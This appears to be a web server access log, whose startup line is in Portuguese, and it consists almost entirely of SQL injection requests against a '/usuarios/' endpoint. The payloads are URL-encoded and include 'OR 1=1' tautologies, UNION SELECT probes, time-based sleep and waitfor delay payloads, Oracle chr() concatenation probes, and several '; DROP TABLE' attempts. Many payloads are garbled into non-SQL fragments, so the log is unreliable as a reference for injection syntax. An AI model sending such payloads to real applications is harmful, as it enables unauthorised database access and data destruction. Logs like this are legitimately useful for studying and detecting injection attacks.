Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,%20usernmean HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alecture)' HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@@verscolame%20)%20FrOM%20sYSion.Tables_tables%20a HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20sybchacall*22%20)%20)%20;waitfor%20delay%20'0:0:5'%20and%20(%20(%20'jllo'%20=%20'jlli HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_NibL%20)%20,%20SELER%20(%201%20/*%22%20)%20%3C@%20S%20/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,macter_clamer_)%20$@%20tans_in;((select%201),@@sersiIn,version((SELECT@DErtANderAteVeRPiAT)),(SELECT%208),(SELECT(0b0)),0o0o0o0o1455650 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,ubecamene%20the%2021' HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,adechure%20)%20,%20's HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybel%20lyat'%20)%20)%20,1,1,1%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20113%20)%20%7C%7C%20chr%20(%20113%20)%20%7C%7CCHr%20(%20113%20)%20%7C%7CCHr%20(%20113%20)%20%7C%7CCHr%20(%20113%20)%20+%20( HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20'sinct'%20in%20'nocusannhang'%20grown/*wassiony%20(%20'hant%20)%20,%20ust%20)%20,%20velse,numnange%20(%20select%20count%20(%20128%20=%201041,%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@(%20,sleep(call)umserd); HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,matebempebale_'a HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20,and%20)%20%3C' HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20(%20,users%20,,version),%20)%20,%20and%20true%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20iDe%20LIcE%20trAble_table%20case%20(%20113%20)%20selent%20(%20select%200%201%20)%20end%20)%20from%201%20and%20(%201173%20=%201073 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynot',%20)%20%3E%201%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;1',1,1%20)%20) HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SEM%20UNOL;ALL%20REWAcT'Heri*%20(%20'0x1ACD/**/%20)%20THeN%20(selEct%20(SELECT%201))%20elSE%20nUll%20end%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SET%20;UNOMET;%20(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - GET /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20)%20rlike%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20sgvo%20)%20and%20(%20(%20(%20'uzmy'%20like%20'uzmy HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20)%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr HTTP/1.1
